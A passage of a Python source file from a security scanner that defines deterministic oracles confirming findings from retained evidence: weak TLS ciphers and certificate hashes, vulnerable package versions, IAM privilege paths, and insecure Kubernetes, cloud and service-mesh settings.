    host = _coerce_text(tls.get("host")).strip()
    version_raw = _coerce_text(tls.get("tls_version")).strip()
    cipher_raw = _coerce_text(tls.get("cipher")).strip()
    version_u = version_raw.upper()
    cipher_u = cipher_raw.upper()

    if version_u in _DEPRECATED_TLS_VERSIONS:
        return OracleSignal(
            kind=OracleKind.TLS_WEAKNESS, fired=True, confidence=0.95,
            evidence=f"{host or 'endpoint'} negotiated deprecated protocol {version_raw}",
            observed={"host": host, "tls_version": version_raw, "cipher": cipher_raw,
                      "reason": "deprecated_protocol"})
    for token, why in _WEAK_CIPHER_TOKENS:
        if token in cipher_u:
            return OracleSignal(
                kind=OracleKind.TLS_WEAKNESS, fired=True, confidence=0.92,
                evidence=f"{host or 'endpoint'} negotiated weak cipher {cipher_raw or '?'} — {why}",
                observed={"host": host, "tls_version": version_raw, "cipher": cipher_raw,
                          "reason": "weak_cipher", "token": token})
    return OracleSignal(
        kind=OracleKind.TLS_WEAKNESS, fired=False, confidence=0.0,
        evidence=f"no TLS weakness: negotiated {version_raw or '?'} / {cipher_raw or '?'}",
        observed={"host": host, "tls_version": version_raw, "cipher": cipher_raw})


# ---------------------------------------------------------------------------
# Weak crypto artifact — a parsed cert signed with a BROKEN hash (MD5/SHA1)
# ---------------------------------------------------------------------------

# Broken signature hashes (collision-forgeable): MD2/MD4/MD5 and SHA-1. `sha1` must NOT match
# sha224/256/384/512 — the negative lookahead ``(?![0-9])`` guards it (SHA-1 is never a prefix of a
# stronger SHA-2 name). Applied ONLY to a controlled signatureAlgorithm OID name, case-insensitive.
_WEAK_SIG_HASH_RE = re.compile(r"(?i)(?:md[245]|sha-?1(?![0-9]))")
# Fallback when the signatureAlgorithm resolved only to a dotted OID: the known broken-hash sig OIDs.
_WEAK_SIG_OIDS = frozenset({
    "1.2.840.113549.1.1.2",   # md2WithRSAEncryption
    "1.2.840.113549.1.1.3",   # md4WithRSAEncryption
    "1.2.840.113549.1.1.4",   # md5WithRSAEncryption
    "1.2.840.113549.1.1.5",   # sha1WithRSAEncryption
    "1.2.840.10040.4.3",      # dsa-with-sha1
    "1.2.840.10045.4.1",      # ecdsa-with-SHA1
    "1.3.14.3.2.29",          # sha1WithRSASignature (legacy)
    "1.3.14.3.2.27",          # dsaWithSHA1 (legacy)
})
# Public-key size floors below which a certificate key provides less than the ~112-bit security NIST has
# required since 2013 (SP 800-131A). Conservative + unambiguous: RSA/DSA < 2048 bits (1024-bit RSA is a
# ~80-bit-security deprecated key; 512-bit is factorable today), EC curve < 224 bits (P-192 and below).
# A 2048-bit RSA / P-256 EC / Ed25519 key is fine and never fires. Ed25519/Ed448 have no classical size.
_MIN_RSA_DSA_BITS = 2048
_MIN_EC_BITS = 224


def weak_crypto_artifact_oracle(observed: Any) -> OracleSignal:
    """Fire when a parsed crypto artifact (an X.509 cert) is signed with a BROKEN hash — MD5/MD4/MD2 or
    SHA-1. These are collision-forgeable (MD5 chosen-prefix, SHA-1 SHAttered) with NO benign use for a
    certificate signature, so a benign modern cert (SHA-256+) does NOT fire. The proof is the retained
    signatureAlgorithm OID NAME (or dotted OID) — a pure, deterministic classification that re-verifies
    offline, exactly like ``tls_weakness_oracle`` re-verifies a negotiated cipher name. Emitted under the
    TLS_WEAKNESS kind (a weak-crypto FACT). Never raises."""
    if not isinstance(observed, Mapping):
        return OracleSignal(kind=OracleKind.TLS_WEAKNESS, fired=False, confidence=0.0,
                            evidence="no crypto-artifact evidence")
    name = _coerce_text(observed.get("signature_algorithm")).strip()
    oid = _coerce_text(observed.get("oid")).strip()
    subject = _coerce_text(observed.get("subject")).strip()
    subj = (" " + subject) if subject else ""
    # (1) BROKEN SIGNATURE HASH — collision-forgeable, no benign use.
    if (name and _WEAK_SIG_HASH_RE.search(name)) or (oid in _WEAK_SIG_OIDS):
        return OracleSignal(
            kind=OracleKind.TLS_WEAKNESS, fired=True, confidence=0.95,
            evidence=(f"certificate{subj} is signed with the BROKEN hash {name or oid} — collision-forgeable "
                      "(MD5 chosen-prefix / SHA-1 SHAttered), no benign use"),
            observed={"signature_algorithm": name, "oid": oid, "subject": subject, "reason": "broken_sig_hash"})
    # (2) UNDERSIZED PUBLIC KEY — below the ~112-bit-security floor (NIST SP 800-131A, deprecated 2013).
    key_type = _coerce_text(observed.get("key_type")).strip().lower()
    try:
        key_bits = int(observed.get("key_bits"))
    except (TypeError, ValueError):
        key_bits = 0
    if key_bits > 0 and (
            (key_type in ("rsa", "dsa") and key_bits < _MIN_RSA_DSA_BITS)
            or (key_type == "ec" and key_bits < _MIN_EC_BITS)):
        floor = _MIN_RSA_DSA_BITS if key_type in ("rsa", "dsa") else _MIN_EC_BITS
        return OracleSignal(
            kind=OracleKind.TLS_WEAKNESS, fired=True, confidence=0.9,
            evidence=(f"certificate{subj} uses an UNDERSIZED {key_type.upper()} public key ({key_bits}-bit, "
                      f"below the {floor}-bit floor) — under ~112-bit security (NIST SP 800-131A, deprecated 2013)"),
            observed={"key_type": key_type, "key_bits": key_bits, "subject": subject, "reason": "short_key"})
    return OracleSignal(
        kind=OracleKind.TLS_WEAKNESS, fired=False, confidence=0.0,
        evidence=f"signature algorithm {name or oid or '?'} is not a broken hash and the key is not undersized")


# ---------------------------------------------------------------------------
# Version range — a package version provably falls in an advisory's affected range
# ---------------------------------------------------------------------------


def version_range_oracle(observed_advisory: Any) -> OracleSignal:
    """Fire when a package's CONCRETE version PROVABLY falls inside a vulnerability advisory's affected
    version range — the deterministic membership check that promotes a scanner's "package X @ V is
    affected by CVE-Y" OBSERVATION into a FACT. A grype/osv/trivy match alone is a LEAD; this oracle
    re-derives the verdict from the retained ``{version, affected}`` evidence, so a scanner's say-so
    never becomes a fact and a mangled range never fabricates one.

    ``observed_advisory`` is JSON-safe evidence::

        {"package": str, "version": str, "vuln_id": str?, "ecosystem": str?,
         "affected": [ {"introduced": "2.0", "fixed": "2.15.0"} | ">=1.0.0,<2.0.0" , ... ]}

    Fires at 0.95 only when ``version_in_affected(version, affected)`` proves membership. Does NOT fire
    when the version is outside the range, the version/range is unparseable, or ``affected`` is empty —
    an absent or negative proof is never an assumed pass (FAIL-CLOSED). Pure and deterministic, so the
    same verdict re-verifies offline from the retained context."""
    from .version import version_in_affected

    if not isinstance(observed_advisory, Mapping):
        return OracleSignal(kind=OracleKind.VERSION_RANGE, fired=False, confidence=0.0,
                            evidence="no advisory evidence")
    adv = observed_advisory
    package = _coerce_text(adv.get("package")).strip()
    version = _coerce_text(adv.get("version")).strip()
    vuln_id = _coerce_text(adv.get("vuln_id")).strip()
    affected = adv.get("affected")

    if not version or affected is None or (isinstance(affected, (list, tuple)) and not affected):
        return OracleSignal(
            kind=OracleKind.VERSION_RANGE, fired=False, confidence=0.0,
            evidence="no concrete version or affected-range to adjudicate",
            observed={"package": package, "version": version, "vuln_id": vuln_id})

    if version_in_affected(version, affected):
        return OracleSignal(
            kind=OracleKind.VERSION_RANGE, fired=True, confidence=0.95,
            evidence=f"{package or 'package'} {version} is in the affected range of {vuln_id or 'the advisory'}",
            observed={"package": package, "version": version, "vuln_id": vuln_id, "reason": "in_range"})
    return OracleSignal(
        kind=OracleKind.VERSION_RANGE, fired=False, confidence=0.0,
        evidence=f"{package or 'package'} {version} is NOT provably in {vuln_id or 'the advisory'}'s affected range",
        observed={"package": package, "version": version, "vuln_id": vuln_id})


# ---------------------------------------------------------------------------
# Policy path — a real IAM grant path lets a principal reach a resource (privesc)
# ---------------------------------------------------------------------------

# Access lattice (a granted level >= the requested level authorises the request). Unknown non-empty
# access tokens are treated as read-tier (2) — a named-but-unrecognised action is not assumed to be
# admin. An UNSPECIFIED (empty) granted access is treated as the MINIMUM (1): a grant statement that
# names no action cannot, by itself, prove a specific write/admin request — it only proves bare
# reachability (a request for access "" — "any path at all"). Conservative by construction.
_ACCESS_LEVEL: dict[str, int] = {
    "list": 1, "read": 2, "get": 2, "describe": 2, "readonly": 2, "read_only": 2, "view": 2,
    "write": 3, "put": 3, "modify": 3, "update": 3, "delete": 3, "create": 3,
    "read_write": 3, "readwrite": 3,
    "admin": 4, "owner": 4, "full": 4, "root": 4, "all": 4, "*": 4, "manage": 4,
}


def _access_level(access: Any) -> int:
    """The lattice level of an access token. Empty/None -> 1 (minimum); an unrecognised non-empty
    token -> 2 (read-tier, never assumed admin); a known token -> its level."""
    a = str(access or "").strip().lower().replace("-", "_")
    if not a:
        return 1
    return _ACCESS_LEVEL.get(a, 2)


def _access_grants(granted: Any, requested: Any) -> bool:
    """True iff a grant of ``granted`` access authorises a request for ``requested`` access. An empty
    request ("any access path") is satisfied by any grant; otherwise the granted level must dominate."""
    if not str(requested or "").strip():
        return True
    return _access_level(granted) >= _access_level(requested)


def _norm_id(value: Any) -> str:
    """Canonical (lowercased, stripped) node key — matches ``intel.from_cloud``'s key normalisation so
    the retained graph and the query agree on identity."""
    return str(value or "").strip().lower()


def policy_path_oracle(observed_policy: Any) -> OracleSignal:
    """Fire when a REAL IAM policy PATH lets a principal reach a resource — the privilege-path half of
    prove-don't-guess for cloud posture. A cloud sensor's "principal X is over-privileged / can reach
    sensitive resource R" is a heuristic LEAD; this oracle does NOT trust that judgement — it
    RE-DERIVES, over the RETAINED raw policy graph, a concrete grant path and fires only if one exists.
    The path (the ordered assume/member hops plus the granting statement) IS the evidence, so the
    verdict re-verifies OFFLINE from the certificate exactly like every other oracle: pure graph search,
    deterministic, no clock/rng, re-runnable by anyone with no cloud and no trust in the sensor.

    ``observed_policy`` is the JSON-safe retained policy graph + the reachability query it is judged on::

        {"principal": "role/dev", "resource": "s3/customer-data", "access": "read"?,
         "grants":    [{"principal": "role/admin", "resource": "s3/customer-data", "access": "read"}],
         "assume":    [{"src": "role/dev",  "dst": "role/admin"}],   # src CAN_ASSUME dst -> inherits its grants
         "member_of": [{"src": "role/dev",  "dst": "group/eng"}]}    # src MEMBER_OF dst -> inherits its grants

    A principal reaches the resource iff SOME principal in its assume/member closure holds a grant over
    the resource whose access dominates the requested access (``access`` omitted / "" means "any grant
    path at all"). No path — or an insufficient access level — does NOT fire (a benign config is not
    confirmed). Matching is exact on canonical (lowercased) ids. GROUNDING is procedural: the graph MUST
    be built from the raw retained export (``verify.policy_path.build_policy_graph``), NEVER laundered
    from the sensor's minted world-model beliefs — that is what keeps this a re-derivation, not a
    rubber-stamp of the sensor's say-so."""
    if not isinstance(observed_policy, Mapping):
        return OracleSignal(kind=OracleKind.POLICY_PATH, fired=False, confidence=0.0,
                            evidence="no policy graph evidence")

    start = _norm_id(observed_policy.get("principal"))
    target = _norm_id(observed_policy.get("resource"))
    requested = str(observed_policy.get("access") or "").strip()
    if not start or not target:
        return OracleSignal(
            kind=OracleKind.POLICY_PATH, fired=False, confidence=0.0,
            evidence="policy query needs both a principal and a resource",
            observed={"principal": start, "resource": target})

    # principal -> principal adjacency (CAN_ASSUME / MEMBER_OF both let the source inherit the dst's
    # grants), and principal -> [(resource, access), ...] grants. Deterministic (sorted) construction.
    adj: dict[str, list[tuple[str, str]]] = {}
    for rel_key, via in (("assume", "can_assume"), ("member_of", "member_of")):
        for e in observed_policy.get(rel_key) or []:
            if not isinstance(e, Mapping):
                continue
            src, dst = _norm_id(e.get("src")), _norm_id(e.get("dst"))
            if src and dst:
                adj.setdefault(src, []).append((dst, via))
    grants: dict[str, list[tuple[str, str]]] = {}
    for g in observed_policy.get("grants") or []:
        if not isinstance(g, Mapping):
            continue
        p, r = _norm_id(g.get("principal")), _norm_id(g.get("resource"))
        if p and r:
            grants.setdefault(p, []).append((r, str(g.get("access") or "")))
    for k in adj:
        adj[k].sort()
    for k in grants:
        grants[k].sort()

    # BFS from the query principal over the assume/member closure, recording the predecessor edge so a
    # firing path can be reconstructed. Deterministic: sorted adjacency, first-found path.
    prev: dict[str, tuple[str, str]] = {}   # node -> (from_node, via)
    order = [start]
    seen = {start}
    hit: tuple[str, str, str] | None = None   # (holder_principal, resource, granted_access)
    i = 0
    while i < len(order):
        cur = order[i]
        i += 1
        for res, acc in grants.get(cur, ()):
            if res == target and _access_grants(acc, requested):
                hit = (cur, res, acc)
                break
        if hit is not None:
            break
        for nxt, via in adj.get(cur, ()):
            if nxt not in seen:
                seen.add(nxt)
                prev[nxt] = (cur, via)
                order.append(nxt)

    if hit is None:
        return OracleSignal(
            kind=OracleKind.POLICY_PATH, fired=False, confidence=0.0,
            evidence=(f"no IAM policy path grants {start!r} "
                      f"{('access '+requested+' ') if requested else ''}to {target!r} "
                      f"(closure of {len(seen)} principal(s) holds no dominating grant)"),
            observed={"principal": start, "resource": target, "access": requested,
                      "reachable_principals": sorted(seen)})

    holder, res, granted = hit
    # reconstruct principal hops start -> ... -> holder
    hops: list[str] = [holder]
    node = holder
    while node != start and node in prev:
        node = prev[node][0]
        hops.append(node)
    hops.reverse()
    path_steps: list[dict[str, str]] = []
    for a, b in zip(hops, hops[1:]):
        via = prev[b][1] if b in prev else "?"
        path_steps.append({"from": a, "via": via, "to": b})
    path_steps.append({"from": holder, "via": "has_grant", "to": res, "access": granted})
    chain = " -> ".join([start] + [f"[{s['via']}] {s['to']}" for s in path_steps])
    return OracleSignal(
        kind=OracleKind.POLICY_PATH,
        fired=True,
        confidence=0.9,
        evidence=(f"IAM policy path grants {start!r} "
                  f"{('access '+requested) if requested else 'access'} to {target!r}: {chain}"),
        observed={"principal": start, "resource": target, "requested_access": requested,
                  "grant_holder": holder, "granted_access": granted, "path": path_steps,
                  "hops": len(path_steps) - 1})


# ---------------------------------------------------------------------------
# K8s posture — a kube-bench CIS control FAILED with a concrete observed insecure setting
# ---------------------------------------------------------------------------
#
# Workstream-3: promote a kube-bench CIS-control-failure LEAD (sensors.k8s_runtime) to a FACT. A
# scanner FAIL is a THIRD-PARTY heuristic say-so; this oracle does NOT trust it — it RE-DERIVES the
# weakness over the RETAINED control evidence: a control is a proven insecure setting only when it hard-
# FAILED (WARN is a manual-review advisory, not a proof) AND its OBSERVED value literally carries a
# dangerous flag (a parse-proof over `actual_value`, mirroring how reflection_context_oracle PARSES to
# prove an executable context rather than substring-matching). A PASSING control never fires (status !=
# FAIL), a FAIL whose observed value shows the SECURE setting never fires (no rule matches), and a FAIL
# with no captured value stays a LEAD (no concrete proof) — near-zero false positives by construction.
#
# Each rule is a (rule_id, compiled regex over the observed flag value, human label). The separator
# `[=:\s]+` matches the kube-bench renderings `--flag=value` / `--flag value` / `--flag: value`. The
# regexes are fixed-alternation and non-backtracking over a LENGTH-CAPPED value (ReDoS-safe), and the
# tuple order is fixed so the verdict is deterministic (same evidence -> same signal, re-runnable
# offline from the certificate exactly like every oracle above).
_K8S_VALUE_CAP = 8192

_INSECURE_SETTING_RULES: tuple[tuple[str, "re.Pattern[str]", str], ...] = (
    ("anonymous_auth_enabled", re.compile(r"(?i)--anonymous-auth[=:\s]+true\b"),
     "--anonymous-auth is enabled (unauthenticated API/kubelet access)"),
    ("authz_mode_always_allow", re.compile(r"(?i)--authorization-mode[=:\s]+\S*alwaysallow"),
     "--authorization-mode includes AlwaysAllow (authorization disabled)"),
    ("insecure_port_open", re.compile(r"(?i)--insecure-port[=:\s]+0*[1-9]\d*"),
     "--insecure-port is a non-zero port (unauthenticated plaintext API)"),
    ("kubelet_read_only_port", re.compile(r"(?i)--read-only-port[=:\s]+0*[1-9]\d*"),
     "kubelet --read-only-port is a non-zero port (unauthenticated read API)"),
    ("basic_auth_file", re.compile(r"(?i)--basic-auth-file[=:\s]+\S+"),
     "--basic-auth-file is set (static-password basic auth)"),
    ("token_auth_file", re.compile(r"(?i)--token-auth-file[=:\s]+\S+"),
     "--token-auth-file is set (static-token auth)"),
    ("etcd_no_client_cert_auth", re.compile(r"(?i)--client-cert-auth[=:\s]+false\b"),
     "etcd --client-cert-auth is false (no client-certificate authentication)"),
    ("profiling_enabled", re.compile(r"(?i)--profiling[=:\s]+true\b"),
     "--profiling is enabled (debug endpoints exposed)"),
)


def k8s_posture_oracle(observed_control: Any) -> OracleSignal:
    """Fire when a kube-bench CIS control PROVABLY carries a concrete insecure setting — the membership/
    parse-proof that promotes ``sensors.k8s_runtime``'s CIS-control-FAILURE LEAD to a FACT. A kube-bench
    FAIL is a third-party CIS-checker's say-so; this oracle re-derives the weakness over the RETAINED
    control so the scanner's verdict is never rubber-stamped and a benign posture is never confirmed.

    ``observed_control`` is the JSON-safe evidence the sensor retained (``sensors.k8s_runtime`` carries
    it in the control lead)::

        {"check_id": "1.2.1", "status": "FAIL", "actual_value": "... --anonymous-auth=true ...",
         "description": str?, "section": str?, "benchmark": "cis-kubernetes"?}

    Fires (0.9) only when ALL hold:
      1. ``status`` is a hard ``FAIL`` — a WARN is a manual-review advisory, not a proof, so it stays a
         LEAD (WARN/PASS/INFO never fire);
      2. the retained ``actual_value`` is present AND one of ``_INSECURE_SETTING_RULES`` matches it — the
         concrete observed value literally carries a dangerous flag (``--anonymous-auth=true``,
         ``--authorization-mode=…AlwaysAllow``, a non-zero ``--insecure-port``, a static auth file, …).

    A PASSING control (``status`` != FAIL), a FAIL whose observed value shows the SECURE setting (no rule
    matches — e.g. ``--anonymous-auth=false``), and a FAIL with no captured value all correctly do NOT
    fire — a control the oracle cannot PROVE insecure stays an honest LEAD. Pure + deterministic, so the
    same verdict re-verifies offline from the retained context. GROUNDING is procedural exactly as for
    every oracle: the control MUST be the sensor's RETAINED kube-bench evidence, never a re-run of the
    tool laundered as a fact."""
    if not isinstance(observed_control, Mapping):
        return OracleSignal(kind=OracleKind.K8S_POSTURE, fired=False, confidence=0.0,
                            evidence="no kube-bench control evidence")
    ctl = observed_control
    check_id = _coerce_text(ctl.get("check_id")).strip()
    status = _coerce_text(ctl.get("status")).strip().upper()
    actual = _coerce_text(ctl.get("actual_value"))[:_K8S_VALUE_CAP]

    if status != "FAIL":
        return OracleSignal(
            kind=OracleKind.K8S_POSTURE, fired=False, confidence=0.0,
            evidence=(f"control {check_id or '?'} status {status or '?'} is not a hard FAIL — "
                      f"not a proven insecure setting (stays a lead)"),
            observed={"check_id": check_id, "status": status})
    if not actual.strip():
        return OracleSignal(
            kind=OracleKind.K8S_POSTURE, fired=False, confidence=0.0,
            evidence=(f"control {check_id or '?'} FAILED but retained no concrete observed value to "
                      f"adjudicate — stays a lead (no near-zero-FP proof)"),
            observed={"check_id": check_id, "status": status})

    for rule_id, pattern, label in _INSECURE_SETTING_RULES:
        m = pattern.search(actual)
        if m is None:
            continue
        hit = m.group(0).strip()
        start = max(0, m.start() - 16)
        snippet = actual[start:m.end() + 16]
        return OracleSignal(
            kind=OracleKind.K8S_POSTURE, fired=True, confidence=0.9,
            evidence=(f"kube-bench control {check_id or '?'} FAILED with a concrete insecure setting: "
                      f"{label} (observed {hit!r}): ...{snippet}..."),
            observed={"check_id": check_id, "status": status, "rule": rule_id,
                      "matched": hit, "reason": "insecure_setting_observed"})

    return OracleSignal(
        kind=OracleKind.K8S_POSTURE, fired=False, confidence=0.0,
        evidence=(f"control {check_id or '?'} FAILED but its observed value carries no recognised "
                  f"dangerous flag — not provably an insecure setting (stays a lead)"),
        observed={"check_id": check_id, "status": status})


# ---------------------------------------------------------------------------
# Cloud / CSPM posture — promote a retained cloud-posture LEAD to a FACT over its ACHIEVED STATE
# (Wave-F1). The achieved-state SIBLING of ``k8s_posture_oracle``.
#
# ``sensors.cloud`` mints three posture LEADS (``GROUNDING_INTEL``): ``public_exposure`` and
# ``excessive_privilege`` are already promoted to FACTs by the EXISTING POLICY_PATH oracle
# (``sensors.cloud.confirm_cloud_posture_facts`` re-derives a grant PATH over the whole policy GRAPH). The
# third — ``misconfiguration`` (encryption-at-rest disabled) — is explicitly ``oracle_provable=False``
# there: "no reachability oracle proves it, so it stays an honest LEAD". THIS oracle fills exactly that
# gap: it promotes a retained cloud control to a FACT over the control's ACHIEVED STATE ALONE (a
# single-record membership/parse-proof, NO graph traversal, NO live cloud call) — mirroring how
# ``k8s_posture_oracle`` re-derives a concrete insecure setting over ONE retained kube-bench control
# rather than trusting the scanner's say-so.
#
# A control fires ONLY on an EXPLICIT insecure achieved-state flag a compliant control cannot exhibit;
# the rule tuple order is fixed so the verdict is deterministic (same evidence -> same signal). An
# EXPLICIT compliant/pass status, secure flags (encryption on, not public, no wildcard principal), or
# only ABSENT/unknown flags all correctly do NOT fire — near-zero false positives by construction.
_CLOUD_STR_CAP = 4096
_CLOUD_MAX_PRINCIPALS = 4096

# A CSPM tool's own PASS/compliant verdict is respected: if the retained control records one of these,
# the oracle never fires (a compliant control is not promoted, mirroring how k8s requires a hard FAIL).
_CLOUD_COMPLIANT_STATUSES = frozenset({
    "pass", "passed", "ok", "compliant", "pass_manual", "info", "informational", "not_applicable",
    "na", "n/a", "skipped", "manual",
})
# Principals that denote "anyone" — an anonymous / wildcard grantee is a public-trust achieved state by
# definition (mirrors ``sensors.cloud._ANON_PRINCIPALS`` so the two agree on what "public" means).
_CLOUD_ANON_PRINCIPALS = frozenset({
    "*", "allusers", "anonymous", "public", "everyone", "authenticatedusers", "allauthenticatedusers",
    "principal:*", "arn:aws:iam::*:root", "**",
})


def _cloud_tri_bool(value: Any) -> bool | None:
    """Coerce a retained flag to True / False / None (unknown). A bool passes through; a string is
    read for an unambiguous enabled/disabled token; anything else (incl. absent) is UNKNOWN (None) — so
    an ABSENT or un-parseable flag can never be mistaken for an EXPLICIT insecure setting (near-zero-FP)."""
    if isinstance(value, bool):
        return value
    if isinstance(value, (int,)) and not isinstance(value, bool):
        return bool(value)
    if isinstance(value, str):
        v = value.strip().lower()
        if v in ("true", "1", "yes", "on", "enabled", "enable"):
            return True
        if v in ("false", "0", "no", "off", "disabled", "disable"):
            return False
    return None


def _cloud_norm_principal(p: Any) -> str:
    return _coerce_text(p)[:_CLOUD_STR_CAP].strip().lower().replace("-", "").replace("_", "")


def _cloud_is_anon_principal(p: Any) -> bool:
    norm = _cloud_norm_principal(p)
    return norm in {a.replace("-", "").replace("_", "") for a in _CLOUD_ANON_PRINCIPALS}


def _cloud_achieved_state(control: Mapping[str, Any]) -> dict[str, Any]:
    """The achieved-state view the rules judge. Accepts a nested ``achieved_state`` sub-dict OR a flat
    resource record (``sensors.cloud`` resources carry public/sensitive/encrypted/grants at top level).
    Principals are gathered from an explicit ``principals`` list AND from ``grants[].principal`` so a
    ScoutSuite/Prowler-shaped or a native inventory record are both judged the same way."""
    src = control.get("achieved_state") if isinstance(control.get("achieved_state"), Mapping) else control
    principals: list[str] = []
    raw_principals = src.get("principals")
    if isinstance(raw_principals, (list, tuple)):
        principals.extend(_coerce_text(p) for p in raw_principals[:_CLOUD_MAX_PRINCIPALS])
    grants = src.get("grants")
    if isinstance(grants, (list, tuple)):
        for g in grants[:_CLOUD_MAX_PRINCIPALS]:
            if isinstance(g, Mapping) and g.get("principal") is not None:
                principals.append(_coerce_text(g.get("principal")))
    return {
        "encrypted": _cloud_tri_bool(src.get("encrypted")),
        "public": _cloud_tri_bool(src.get("public")),
        "sensitive": _cloud_tri_bool(src.get("sensitive")),
        "principals": principals,
    }


def cloud_posture_oracle(observed_control: Any) -> OracleSignal:
    """Fire when a retained cloud/CSPM posture control PROVABLY carries an insecure ACHIEVED STATE — the
    membership/parse-proof that promotes a ``sensors.cloud`` posture LEAD to a FACT over the control's
    achieved state ALONE (offline, ZERO cloud calls). The achieved-state sibling of ``k8s_posture_oracle``:
    a CSPM tool's "public / mis-configured" is a third-party heuristic; this oracle re-derives the insecure
    state over the RETAINED control so the scanner's verdict is never rubber-stamped and a benign posture
    is never confirmed.

    ``observed_control`` is the JSON-safe retained control (a nested ``achieved_state`` sub-dict, or a flat
    ``sensors.cloud`` resource record)::

        {"control_id": "s3-encryption-at-rest"?, "resource_id": "acme-secrets"?, "status": "FAIL"?,
         "provider": "aws"?, "achieved_state": {"encrypted": false, "public": false, "sensitive": true,
                                                "principals": ["arn:aws:iam::123:role/app"]}}
        # or flat: {"id": "acme-secrets", "encrypted": false, "sensitive": true, "public": false,
        #           "grants": [{"principal": "*", "access": "read"}]}

    Fires (0.9) only when an EXPLICIT insecure achieved-state flag holds (fixed rule order):
      1. ``encryption_at_rest_disabled`` — ``encrypted`` explicitly ``false`` AND the resource is
         ``sensitive`` (the exact ``cloud_posture_leads`` ``misconfiguration`` condition — the lead the
         POLICY_PATH oracle STRUCTURALLY cannot prove, now provable as an achieved STATE);
      2. ``public_exposure`` — ``public`` explicitly ``true`` (an achieved public-access state);
      3. ``wildcard_principal`` — a wildcard/anonymous principal (``*`` / ``AllUsers`` / ``anonymous`` / …)
         literally named in the retained resource policy (``principals`` or ``grants[].principal``).

    Does NOT fire (stays an honest LEAD) when: the control records an EXPLICIT compliant/pass status; the
    flags show the SECURE setting (``encrypted`` true, ``public`` false, no wildcard principal); or every
    relevant flag is ABSENT/unknown (unknown is never an insecure fact). Malformed / non-mapping evidence
    -> non-fire (never raises). Pure + deterministic, so the same verdict re-verifies offline from the
    retained context. GROUNDING is procedural exactly as for every oracle: the control MUST be the
    sensor's RETAINED cloud evidence, never a re-run of a live cloud call laundered as a fact."""
    if not isinstance(observed_control, Mapping):
        return OracleSignal(kind=OracleKind.CLOUD_POSTURE, fired=False, confidence=0.0,
                            evidence="no cloud posture control evidence")
    ctl = observed_control
    rid = _coerce_text(ctl.get("resource_id") or ctl.get("id"))[:_CLOUD_STR_CAP].strip()
    cid = _coerce_text(ctl.get("control_id") or ctl.get("check_id"))[:_CLOUD_STR_CAP].strip()
    status = _coerce_text(ctl.get("status")).strip().lower()
    label = rid or cid or "?"

    # Respect an EXPLICIT compliant verdict — a control the CSPM tool passed is never promoted.
    if status in _CLOUD_COMPLIANT_STATUSES:
        return OracleSignal(
            kind=OracleKind.CLOUD_POSTURE, fired=False, confidence=0.0,
            evidence=(f"cloud control {label} records a compliant status {status!r} — not an insecure "
                      f"achieved state (stays a lead)"),
            observed={"resource_id": rid, "control_id": cid, "status": status})

    state = _cloud_achieved_state(ctl)
    encrypted, public, sensitive = state["encrypted"], state["public"], state["sensitive"]
    anon = [p for p in state["principals"] if _cloud_is_anon_principal(p)]

    # Rule 1 — encryption-at-rest DISABLED on a sensitive datastore (the misconfiguration lead the
    # policy-path oracle cannot prove; provable here as an achieved STATE). EXPLICIT false + sensitive.
    if encrypted is False and sensitive is True:
        return OracleSignal(
            kind=OracleKind.CLOUD_POSTURE, fired=True, confidence=0.9,
            evidence=(f"cloud posture fact: sensitive resource {label} has encryption-at-rest DISABLED "
                      f"(achieved state: encrypted=false, sensitive=true) — the un-reachability-provable "
                      f"misconfiguration lead, promoted over the retained achieved state"),
            observed={"resource_id": rid, "control_id": cid, "rule": "encryption_at_rest_disabled",
                      "reason": "insecure_achieved_state", "encrypted": False, "sensitive": True})

    # Rule 2 — an achieved PUBLIC-EXPOSURE flag (explicitly public).
    if public is True:
        return OracleSignal(
            kind=OracleKind.CLOUD_POSTURE, fired=True, confidence=0.9,
            evidence=(f"cloud posture fact: resource {label} is PUBLICLY EXPOSED "
                      f"(achieved state: public=true) — promoted over the retained achieved state"),
            observed={"resource_id": rid, "control_id": cid, "rule": "public_exposure",
                      "reason": "insecure_achieved_state", "public": True})

    # Rule 3 — a wildcard/anonymous principal literally named in the retained resource policy.
    if anon:
        who = anon[0]
        return OracleSignal(
            kind=OracleKind.CLOUD_POSTURE, fired=True, confidence=0.9,
            evidence=(f"cloud posture fact: resource {label} grants a WILDCARD/anonymous principal "
                      f"{who!r} (achieved state: an anonymous grantee is named in the retained policy) — "
                      f"promoted over the retained achieved state"),
            observed={"resource_id": rid, "control_id": cid, "rule": "wildcard_principal",
                      "reason": "insecure_achieved_state", "principal": who})

    return OracleSignal(
        kind=OracleKind.CLOUD_POSTURE, fired=False, confidence=0.0,
        evidence=(f"cloud control {label} carries no EXPLICIT insecure achieved-state flag "
                  f"(encryption on / not public / no wildcard principal, or flags absent) — not provably "
                  f"an insecure state (stays a lead)"),
        observed={"resource_id": rid, "control_id": cid, "status": status,
                  "encrypted": encrypted, "public": public, "sensitive": sensitive})


# ---------------------------------------------------------------------------
# Service-mesh posture — promote a retained mesh-config LEAD to a FACT over its ACHIEVED STATE
# (Wave-G3). The MESH twin of ``k8s_posture_oracle`` / ``cloud_posture_oracle``.
#
# A mesh linter / config export reports "PeerAuthentication is PERMISSIVE" or "this AuthorizationPolicy
# allows everyone". That is a THIRD-PARTY LEAD — a `fact` only when a deterministic oracle proves a
# CONCRETE insecure ACHIEVED STATE over the RETAINED mesh config. This oracle re-derives the weakness over
# ONE retained control (a single-record membership/parse-proof, NO kubectl, NO mesh API, NO graph
# traversal, NO ATTACK) — mirroring how ``cloud_posture_oracle`` judges one retained cloud control.
#
# A control fires ONLY on an EXPLICIT insecure achieved-state a HARDENED mesh cannot exhibit; the rule
# order is fixed so the verdict is deterministic (same evidence -> same signal). A STRICT PeerAuthentication,
# a scoped/deny AuthorizationPolicy, an ALLOW policy with no rules (deny-all), an authenticated Linkerd
# inbound policy, or only ABSENT/unknown fields all correctly do NOT fire — near-zero false positives by
# construction. Malformed / non-mapping evidence -> non-fire (never raises).
_MESH_STR_CAP = 4096
_MESH_MAX_RULES = 4096

# Istio PeerAuthentication effective mTLS modes that ACCEPT plaintext transport (a STRICT mesh cannot
# exhibit these). UNSET/absent is NOT here — an absent mode inherits a parent and is never promoted.
_MESH_PERMISSIVE_MTLS = frozenset({"permissive", "disable"})
# Linkerd server ``default-inbound-policy`` values that admit any (even unmeshed / unauthenticated) client.
_MESH_UNAUTH_INBOUND = frozenset({"all-unauthenticated", "all_unauthenticated"})
# Principals that denote "anyone" in an Istio AuthorizationPolicy ``from.source`` clause.
_MESH_ANON_PRINCIPALS = frozenset({"*"})
# A linter/validator's own PASS/compliant verdict is respected: the oracle never promotes a passing control
